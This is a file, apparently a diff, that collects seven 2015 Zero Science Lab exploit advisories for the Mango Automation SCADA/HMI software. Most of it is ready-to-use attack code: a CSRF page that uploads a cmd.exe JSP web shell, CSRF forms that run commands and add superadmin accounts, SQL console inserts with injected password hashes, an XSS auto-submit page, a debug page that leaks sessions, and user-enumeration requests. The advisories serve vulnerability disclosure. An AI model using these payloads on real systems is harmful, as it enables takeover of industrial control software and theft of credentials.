@@ -1,0 +1,361 @@
+Mango Automation 2.6.0 CSRF File Upload And Arbitrary JSP Code Execution
+
+
+Vendor: Infinite Automation Systems Inc.
+Product web page: http://www.infiniteautomation.com/
+Affected version: 2.5.2 and 2.6.0 beta (build 327)
+
+Summary: Mango Automation is a flexible SCADA, HMI And Automation software application that allows you
+to view, log, graph, animate, alarm, and report on data from sensors, equipment, PLCs, databases, webpages,
+etc. It is easy, affordable, and open source.
+
+Desc: Mango suffers from an authenticated arbitrary JSP code execution. The vulnerability is caused due
+to the improper verification of uploaded image files in 'graphicalViewsBackgroundUpload' script via the
+'backgroundImage' POST parameter which allows of arbitrary files being uploaded in '/modules/graphicalViews/web/graphicalViewUploads/'.
+This can be exploited to execute arbitrary JSP code by uploading a malicious JSP script file that will be
+stored as a sequence number depending on how many files were uploaded (1.jsp or 2.jsp or 3.jsp .. n.jsp).
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit
+           Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit
+           Jetty(9.2.2.v20140723)
+           Java(TM) SE Runtime Environment (build 1.8.0_51-b16)
+           Java HotSpot(TM) Client VM (build 25.51-b03, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5262
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5262.php
+
+
+20.08.2015
+
+--
+
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:8080/graphicalViewsBackgroundUpload", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryb8cxmjBwpzDcHUVI");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundaryb8cxmjBwpzDcHUVI\r\n" + 
+          "Content-Disposition: form-data; name=\"backgroundImage\"; filename=\"cmd.jsp\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3c%@ page import=\"java.util.*,java.io.*,java.net.*\"%\x3e\r\n" + 
+          "\x3cHTML\x3e\x3cBODY\x3e\r\n" + 
+          "\x3cFORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\"\x3e\r\n" + 
+          "\x3cINPUT TYPE=\"text\" NAME=\"cmd\"\x3e\r\n" + 
+          "\x3cINPUT TYPE=\"submit\" VALUE=\"Send\"\x3e\r\n" + 
+          "\x3c/FORM\x3e\r\n" + 
+          "\x3cpre\x3e\r\n" + 
+          "\x3c%\r\n" + 
+          "if (request.getParameter(\"cmd\") != null) {\r\n" + 
+          "        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n\x3cBR\x3e\");\r\n" + 
+          "        Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\"));\r\n" + 
+          "        OutputStream os = p.getOutputStream();\r\n" + 
+          "        InputStream in = p.getInputStream();\r\n" + 
+          "        DataInputStream dis = new DataInputStream(in);\r\n" + 
+          "        String disr = dis.readLine();\r\n" + 
+          "        while ( disr != null ) {\r\n" + 
+          "                out.println(disr); disr = dis.readLine(); }\r\n" + 
+          "        }\r\n" + 
+          "%\x3e\r\n" + 
+          "\x3c/pre\x3e\r\n" + 
+          "\x3c/BODY\x3e\x3c/HTML\x3e\r\n" + 
+          "------WebKitFormBoundaryb8cxmjBwpzDcHUVI--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+
+Webshell: http://localhost:8080/modules/graphicalViews/web/graphicalViewUploads/17.jsp
+
+#################################################################
+
+Mango Automation 2.6.0 CSRF Arbitrary Command Execution Exploit
+
+
+Advisory ID: ZSL-2015-5261
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5261.php
+
+
+20.08.2015
+
+--
+
+
+<html>
+  <body>
+    <form action="http://localhost:8080/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr" method="POST">
+      <input type="hidden" name="callCount" value="1" />
+      <input type="hidden" name="page" value="&#47;event&#95;handlers&#46;shtm" />
+      <input type="hidden" name="httpSessionId" value="&#13;" />
+      <input type="hidden" name="scriptSessionId" value="26D579040C1C11D2E21D1E5F321094E5866" />
+      <input type="hidden" name="c0&#45;scriptName" value="EventHandlersDwr" />
+      <input type="hidden" name="c0&#45;methodName" value="testProcessCommand" />
+      <input type="hidden" name="c0&#45;id" value="0" />
+      <input type="hidden" name="c0&#45;param0" value="string&#58;C&#58;&#92;&#92;windows&#92;&#92;system32&#92;&#92;calc&#46;exe" />
+      <input type="hidden" name="c0&#45;param1" value="string&#58;15" />
+      <input type="hidden" name="batchId" value="24" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+#################################################################
+
+Mango Automation 2.6.0 Unprotected Debug Log View Vulnerability
+
+
+Advisory ID: ZSL-2015-5260
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5260.php
+
+
+20.08.2015
+
+--
+
+
+One scenario is where the attacker visits the following URL and takes over the admin session (given that the administrator didn't manually disabled the debugging and has produced some exception in current session):
+
+ - http://localhost:8080/status/
+ 
+Other scenario is where the attacker sends a link to the victim so the victim after clicking on the link, generates exception and writes all his session attributes in the status page:
+
+ - http://localhost/status/mango.json?time=$
+ - http://localhost/status/
+
+
+Sample status output:
+\"$\"\r\n\r\n\r\nSESSION ATTRIBUTES\r\n   sessionUser=User [id=6, username=n00b, password=NWoZK3kTsExUV00Ywo1G5jlUKKs=, email=z@s.l, phone=123321, admin=true, disabled=false, dataSourcePermissions=[], dataPointPermissions=[], homeUrl=, lastLogin=1440142956496, receiveAlarmEmails=0, receiveOwnAuditEvents=false, timezone=]\r\n   LONG_POLL_DATA_TIMEOUT=1440143583487\r\n   LONG_POLL_DATA=[com.serotonin.m2m2.web.dwr.longPoll.LongPollData@839308, com.serotonin.m2m2.web.dwr.longPoll.LongPollData@1b4dafa]\r\n\r\n\r\nCONTEXT ATTRIBUTES\r\n   DwrContainer=org.directwebremoting.impl.DefaultContainer@138158\r\n   constants.EventType.EventTypeNames.AUDIT=AUDIT\r\n   constants.SystemEventType.TYPE_USER_LOGIN=USER_LOGIN\r\n   constants.Permissions.DataPointAccessTypes.READ=1\r\n   org.directwebremoting.ContainerList=[org.directwebremoting.impl.DefaultContainer@138158]\r\n   constants.DataTypes.BINARY=1\r\n   constants.UserComment.TYPE_EVENT=1\r\n   constants.SystemEventType.TYPE_SYSTEM_STARTUP=SYSTEM_STARTUP\r\n   javax.servlet.ServletConfig=org.eclipse.jetty.servlet.ServletHolder$Config@bc620e\r\n   
+
+
+Also you can list all of the Classes known to DWR:
+
+ - http://localhost:8080/dwr/index.html
+
+#################################################################
+
+Mango Automation 2.6.0 CSRF Arbitrary SQL Query Execution
+
+Advisory ID: ZSL-2015-5259
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5259.php
+
+
+20.08.2015
+
+--
+
+
+SQL query in version 2.5.2 (pass 123123) with hash injection:
+-------------------------------------------------------------
+INSERT INTO USERS VALUES(1337,'gjoko','YB8YiWZ++uuzO4wSVyg12j8Cf3g=','gjoko@z.sl','','Y','N',1440075860103,'','0','N','','Y');
+1 records(s) updated.
+
+
+SQL query in version 2.6.0 beta build 327 (pass 123123) with hash injection:
+----------------------------------------------------------------------------
+INSERT INTO USERS VALUES(1337,'gjoko','YB8YiWZ++uuzO4wSVyg12j8Cf3g=','gjoko@z.sl','','N',1440075860103,'','0','N','','Y','superadmin');
+1 records(s) updated.
+
+USERS table:
+ID USERNAME PASSWORD EMAIL PHONE DISABLED LASTLOGIN HOMEURL RECEIVEALARMEMAILS RECEIVEOWNAUDITEVENTS TIMEZONE MUTED PERMISSIONS
+
+1.
+
+POST /sqlConsole.shtm HTTP/1.1
+Host: localhost:8080
+Content-Length: 51
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/sqlConsole.shtm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1
+
+sqlString=select+*+from+users%3B&query=Submit+query
+
+
+2. 
+
+POST /sqlConsole.shtm HTTP/1.1
+Host: localhost:8080
+Content-Length: 54
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/sqlConsole.shtm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1
+
+sqlString=select+*+from+users%3B&tables=Get+table+list
+
+
+3. 
+
+
+POST /sqlConsole.shtm HTTP/1.1
+Host: localhost:8080
+Content-Length: 246
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/sqlConsole.shtm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1
+
+sqlString=INSERT+INTO+USERS+VALUES%289%2C%27gjoko3%27%2C%27YB8YiWZ%2B%2BuuzO4wSVyg12j8Cf3g%3D%27%2C%27gjoko%40z.sl%27%2C%27333222111%27%2C%27Y%27%2C%27N%27%2C1440075860103%2C%27%27%2C%270%27%2C%27N%27%2C%27%27%2C%27Y%27%29%3B&update=Submit+update
+
+#################################################################
+
+Mango Automation 2.6.0 CSRF Add Admin Exploit
+
+Advisory ID: ZSL-2015-5258
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5258.php
+
+
+20.08.2015
+
+--
+
+2.5.2:
+<!-- user hacker, pass 123123 -->
+<html>
+  <body>
+    <form action="http://localhost:8080/dwr/call/plaincall/UsersDwr.saveUserAdmin.dwr" method="POST" enctype="text/plain">
+      <input type="hidden" name="callCount" value="1&#10;page&#61;&#47;users&#46;shtm&#10;httpSessionId&#61;&#10;scriptSessionId&#61;8BD64066486071219EB8691611D48F14109&#10;c0&#45;scriptName&#61;UsersDwr&#10;c0&#45;methodName&#61;saveUserAdmin&#10;c0&#45;id&#61;0&#10;c0&#45;param0&#61;number&#58;&#45;1&#10;c0&#45;param1&#61;string&#58;hacker&#10;c0&#45;param2&#61;string&#58;123123&#10;c0&#45;param3&#61;string&#58;hacker&#37;40hacker&#46;hack&#10;c0&#45;param4&#61;string&#58;111222333&#10;c0&#45;param5&#61;boolean&#58;true&#10;c0&#45;param6&#61;boolean&#58;false&#10;c0&#45;param7&#61;string&#58;0&#10;c0&#45;param8&#61;boolean&#58;false&#10;c0&#45;param9&#61;string&#58;&#10;c0&#45;param10&#61;Array&#58;&#91;&#93;&#10;c0&#45;param11&#61;Array&#58;&#91;&#93;&#10;batchId&#61;5&#10;" />
+      <input type="submit" value="Submit request 1" />
+    </form>
+  </body>
+</html>
+
+
+2.6.0 beta (build 327):
+<!-- user hacker3, pass admin (in sha1(base64) hash value) -->
+<html>
+  <body>
+    <form action="http://localhost:8080/rest/v1/users.json" method="POST" enctype="text/plain">
+      <input type="hidden" name="&#123;&quot;username&quot;&#58;&quot;hacker3&quot;&#44;&quot;password&quot;&#58;&quot;0DPiKuNIrrVmD8IUCuw1hQxNqZc" value="&quot;&#44;&quot;email&quot;&#58;&quot;hacker&#64;zeroscience&#46;mk&quot;&#44;&quot;phone&quot;&#58;&quot;111222333&quot;&#44;&quot;muted&quot;&#58;true&#44;&quot;disabled&quot;&#58;false&#44;&quot;homeUrl&quot;&#58;&quot;http&#58;&#47;&#47;www&#46;zeroscience&#46;mk&quot;&#44;&quot;receiveAlarmEmails&quot;&#58;&quot;NONE&quot;&#44;&quot;receiveOwnAuditEvents&quot;&#58;false&#44;&quot;timezone&quot;&#58;&quot;&quot;&#44;&quot;permissions&quot;&#58;&quot;user&#44;superadmin&quot;&#125;" />
+      <input type="submit" value="Submit request 2" />
+    </form>
+  </body>
+</html>
+
+#################################################################
+
+Mango Automation 2.6.0 Remote XSS POST Injection Vulnerability
+
+Advisory ID: ZSL-2015-5257
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5257.php
+
+
+20.08.2015
+
+--
+
+
+<html>
+  <head>
+    <title>Mango Automation 2.6.0 Remote XSS POST Injection Vulnerability</title>
+  </head>
+  <body>
+    <form name="login" method="post" action="http://localhost:8080/login.htm">
+    <input type="hidden" name="username" value='"><script>alert("XSS");</script>' />
+    <input type="hidden" name="password" value="blah" />
+    </form>
+    <script type="text/javascript">
+    document.login.submit();
+    </script>
+  </body>
+</html>
+
+#################################################################
+
+Mango Automation 2.6.0 User Enumeration Weakness
+
+Advisory ID: ZSL-2015-5256
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5256.php
+
+
+20.08.2015
+
+--
+
+
+Request for non-existent username:
+----------------------------------
+
+POST /login.htm HTTP/1.1
+Host: localhost:8080
+Content-Length: 29
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/login.htm;jsessionid=6zpfpnxljyzf13l3zrpx9e0xd
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=6zpfpnxljyzf13l3zrpx9e0xd
+
+username=noob&password=123123
+
+
+Response:
+
+ - <td class="formError">User id not found</td>
+
+
+Request for existent username:
+------------------------------
+
+POST /login.htm HTTP/1.1
+Host: localhost:8080
+Content-Length: 32
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/login.htm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=6zpfpnxljyzf13l3zrpx9e0xd
+
+username=admin&password=123123
+
+
+Response:
+
+ - <td colspan="3" class="formError">Invalid login<br/>
